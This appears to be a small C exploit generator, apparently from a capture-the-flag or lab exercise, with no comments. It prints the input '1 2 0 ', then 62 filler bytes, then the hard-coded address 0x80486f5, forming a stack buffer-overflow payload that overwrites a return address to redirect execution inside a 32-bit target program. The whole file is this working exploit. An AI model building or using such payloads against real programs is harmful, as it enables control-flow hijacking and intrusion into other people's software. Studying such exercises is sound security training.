#include <stdio.h>
#include <stdint.h>

int main(){
  int pad = 0x3e;
  uintptr_t addr = 0x80486f5;
  
  fwrite("1 2 0 ",1,6,stdout);

  for (int i=0; i< pad; i++){
    char dummy;
    fwrite(&dummy, 1,1,stdout);
  }
  fwrite(&addr, 1 , sizeof(uintptr_t),stdout);

  return 0;
}